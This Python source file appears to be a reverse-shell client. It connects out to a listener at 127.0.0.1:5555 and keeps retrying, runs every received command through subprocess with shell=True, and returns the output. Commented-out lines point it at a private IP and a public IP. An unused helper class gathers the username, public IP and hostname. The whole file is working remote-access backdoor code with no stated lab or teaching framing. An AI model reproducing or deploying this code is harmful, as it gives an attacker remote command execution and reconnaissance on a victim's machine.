import getpass
import socket
import os
import subprocess
import sys

import requests


class HostInf:
    def __init__(self):
        pass

    @property
    def getUsr(self):
        try:
            return getpass.getuser()
        except:
            return 'null'

    @property
    def getMac(self):
        try:
            return ""
        except:
            return 'null'

    @property
    def getIp(self):
        try:
            return requests.get("https://api.ipify.org/").text
        except:
            return 'null'

    @property
    def getDesk(self):
        try:
            return socket.gethostname()
        except:
            return 'null'


class Client:
    def Cprint(self, ToBePrinted):
        print(ToBePrinted)

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.BUFF = 10240
        self.utf8 = "utf-8"

        self.socket = socket.socket()
        self.socket.connect((self.host, self.port))
        while True:
            self.commands = self.Recv()
            if len(str.encode(self.commands)) > 0:
                if self.commands[:2] == 'cd':
                    self.Cprint("Tryed To Change Dir To " + str(self.commands[3:]))
                    try:
                        os.chdir(self.commands[3:])
                        # self.socket.send(str.encode("\n" + os.getcwd() + "> "))
                        self.Send("")
                    except:
                        # self.socket.send(str.encode("Path Does Not Exists" + "\n" + os.getcwd() + "> "))
                        self.Send("Path Does Not Exists")
                elif self.commands == "exited":

                    self.socket.close()
                    break
                elif self.commands[:5] == 'host.':
                    pass
                else:
                    self.output = subprocess.Popen(self.commands[:], shell=True, stderr=subprocess.PIPE,
                                                   stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                    self.result = self.output.stdout.read() + self.output.stderr.read()
                    self.result = str(self.result, self.utf8)
                    # self.socket.send(str.encode(self.result + "\n" + os.getcwd() + "> "))
                    self.Send(self.result)
    def Recv(self):
        self.BUFF = int(self.socket.recv(self.BUFF).decode(self.utf8))
        res = str(self.socket.recv(self.BUFF), self.utf8)
        self.BUFF = 10240
        return res
    def Send(self, msg):
        self.socket.send(str.encode(str(sys.getsizeof(msg))))
        self.socket.send(str.encode(msg + "\n" + os.getcwd() + "> "))


running = 0
while True:
    running += 1
    try:
        Client('127.0.0.1', 5555)
    except Exception as e:
        if "10061" in str(e):
            print(f"Connection Refused {running} times")
# Client('192.168.225.85', 5555)
# Client('3.110.118.16', 56639)
